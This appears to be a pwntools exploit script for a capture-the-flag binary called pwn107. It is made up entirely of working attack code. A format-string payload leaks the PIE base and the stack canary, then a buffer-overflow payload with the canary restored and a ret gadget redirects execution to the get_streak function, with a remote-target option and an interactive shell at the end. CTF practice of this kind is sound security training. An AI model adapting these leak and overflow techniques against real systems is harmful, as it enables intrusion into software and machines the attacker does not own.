from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

exe = './pwn107.pwn107'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

io.recvuntil(b'streak? ')
#io.sendline(b'%14$lx-%13$lx') #REMOTE
io.sendline(b'%9$lx-%13$lx') #LOCAL
io.recvline()
leak = io.recvline().strip().split(b' ')[3]
print(leak)

pie = int(leak.split(b'-')[0], 16)
pie_base = pie - 0xa90
canary = int(leak.strip().split(b'-')[1], 16)
log.info("Pie: %s" % hex(pie))
log.info("Pie Base: %s" % hex(pie_base))
log.info("Canary: %s" % hex(canary))

payload = flat(
            b"A"*24,
            p64(canary),
            b"B"*8,
            p64(pie_base + 0x06fe),  #ret gadget
            p64(pie_base + 0x094c) #get_streak
            
        )

io.sendline(payload)
io.interactive()
